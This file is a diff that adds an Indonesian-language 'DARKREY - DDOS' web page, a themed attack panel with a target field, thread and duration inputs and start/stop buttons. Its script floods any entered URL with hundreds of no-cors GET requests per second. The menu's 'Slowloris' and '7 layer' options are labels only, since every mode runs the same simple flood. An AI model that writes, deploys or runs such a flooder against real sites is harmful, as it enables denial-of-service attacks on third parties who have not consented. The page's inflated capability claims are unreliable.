@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>DARKREY - DDOS</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; font-family: 'Courier New', monospace; color: #0f0; min-height: 100vh; position: relative; overflow-x: hidden; }
+        #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.2; pointer-events: none; }
+        .refresh-indicator { position: fixed; top: -50px; left: 0; width: 100%; height: 50px; background: rgba(255,0,0,0.9); color: #fff; display: flex; justify-content: center; align-items: center; font-size: 14px; transition: top 0.3s; z-index: 9999; }
+        .container { position: relative; z-index: 10; max-width: 600px; margin: 0 auto; padding: 20px; min-height: 100vh; display: flex; align-items: center; }
+        .card { background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 1px solid #f00; border-radius: 24px; padding: 30px; width: 100%; box-shadow: 0 0 30px rgba(255,0,0,0.2); }
+        h1 { color: #f00; text-align: center; font-size: 1.8rem; margin-bottom: 8px; }
+        .back-btn { display: inline-block; background: #333; color: #f00; border: 1px solid #f00; padding: 8px 16px; border-radius: 8px; cursor: pointer; margin-bottom: 20px; font-family: monospace; }
+        input, select, button { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #f00; color: #0f0; border-radius: 12px; font-family: monospace; }
+        button { font-weight: bold; cursor: pointer; }
+        button:hover { background: #f00; color: #000; }
+        .log { background: #000; border: 1px solid #f00; border-radius: 12px; height: 200px; overflow-y: auto; padding: 12px; font-size: 11px; margin-top: 15px; }
+        .log-entry { border-left: 2px solid #f00; padding-left: 10px; margin: 5px 0; word-break: break-all; }
+        .flex { display: flex; gap: 10px; }
+        @media (max-width: 480px) { .card { padding: 20px; } h1 { font-size: 1.4rem; } }
+    </style>
+</head>
+<body>
+<canvas id="matrixCanvas"></canvas>
+<div id="refreshIndicator" class="refresh-indicator">↓ Tarik ke bawah untuk refresh</div>
+<div class="container">
+    <div class="card">
+        <button class="back-btn" onclick="window.location.href='index.html'">← BACK</button>
+        <h1>💀 DDOS 7 LAYER</h1>
+        <input type="text" id="target" placeholder="Target (contoh: https://target.com)">
+        <select id="layer"><option value="http">HTTP FLOOD</option><option value="https">HTTPS FLOOD</option><option value="slow">SLOWLORIS</option></select>
+        <div class="flex"><input type="number" id="threads" placeholder="Threads" value="100"><input type="number" id="duration" placeholder="Durasi (detik)" value="10"></div>
+        <button onclick="startDDoS()">🔥 START ATTACK</button><button onclick="stopDDoS()">⏹️ STOP ATTACK</button>
+        <div id="ddosLog" class="log">[READY]</div><div id="packetStats" style="color:#f00; font-size:12px;">📊 Packets: 0</div>
+    </div>
+</div>
+<script>
+    const canvas = document.getElementById('matrixCanvas'); const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const chars = "01アイウエオカキクケコサシスセソタチツテト0123456789"; const fontSize = 14; const columns = canvas.width / fontSize; const drops = [];
+    for(let i=0;i<columns;i++) drops[i]=1;
+    function drawMatrix() { ctx.fillStyle='rgba(0,0,0,0.04)'; ctx.fillRect(0,0,canvas.width,canvas.height); ctx.fillStyle='#0f0'; ctx.font=fontSize+'px monospace'; for(let i=0;i<drops.length;i++){ const text=chars[Math.floor(Math.random()*chars.length)]; ctx.fillText(text,i*fontSize,drops[i]*fontSize); if(drops[i]*fontSize>canvas.height && Math.random()>0.975) drops[i]=0; drops[i]++; } }
+    setInterval(drawMatrix,50); window.addEventListener('resize',()=>{ canvas.width=window.innerWidth; canvas.height=window.innerHeight; });
+    let touchStartY=0, refreshIndicator=document.getElementById('refreshIndicator');
+    document.addEventListener('touchstart',e=>{ touchStartY=e.touches[0].clientY; });
+    document.addEventListener('touchmove',e=>{ if((window.scrollY||document.documentElement.scrollTop)===0 && e.touches[0].clientY>touchStartY+50) refreshIndicator.style.top='0px'; });
+    document.addEventListener('touchend',()=>{ if(refreshIndicator.style.top==='0px'){ refreshIndicator.style.top='-50px'; location.reload(); } });
+    if(localStorage.getItem('darkray_logged')!=='true') window.location.href='login.html';
+    let attackActive=false, packetCount=0, attackInterval=null;
+    function addLog(msg,isError){ const d=document.getElementById('ddosLog'); if(d){ const div=document.createElement('div'); div.className='log-entry'; div.innerHTML=`[${new Date().toLocaleTimeString()}] ${msg}`; div.style.color=isError?'#ff8888':'#88ff88'; d.appendChild(div); div.scrollIntoView(); if(d.children.length>50) d.removeChild(d.children[0]); } }
+    async function sendRequest(url){ try{ await fetch(url,{method:'GET',mode:'no-cors'}).catch(()=>{}); }catch(e){} }
+    function startDDoS(){ let target=document.getElementById('target').value.trim(), threads=parseInt(document.getElementById('threads').value); if(!target){ addLog('Target required!',true); return; } if(attackActive){ addLog('Already running!',true); return; } if(!target.startsWith('http')) target='https://'+target; if(threads>500) threads=500; attackActive=true; packetCount=0; let startTime=Date.now(); addLog(`🔥 ATTACK ON ${target} WITH ${threads} THREADS!`,false); attackInterval=setInterval(()=>{ if(!attackActive) return; for(let i=0;i<threads;i++) sendRequest(target); packetCount+=threads; let elapsed=(Date.now()-startTime)/1000; let rate=(packetCount/elapsed).toFixed(0); document.getElementById('packetStats').innerHTML=`📊 Packets: ${packetCount} | ⚡ Rate: ${rate} req/s`; },1000); let duration=parseInt(document.getElementById('duration').value); if(duration>0) setTimeout(()=>stopDDoS(),duration*1000); }
+    function stopDDoS(){ if(attackInterval) clearInterval(attackInterval); attackActive=false; addLog(`⛔ STOPPED. Total: ${packetCount}`,true); }
+</script>
+</body>
+</html>
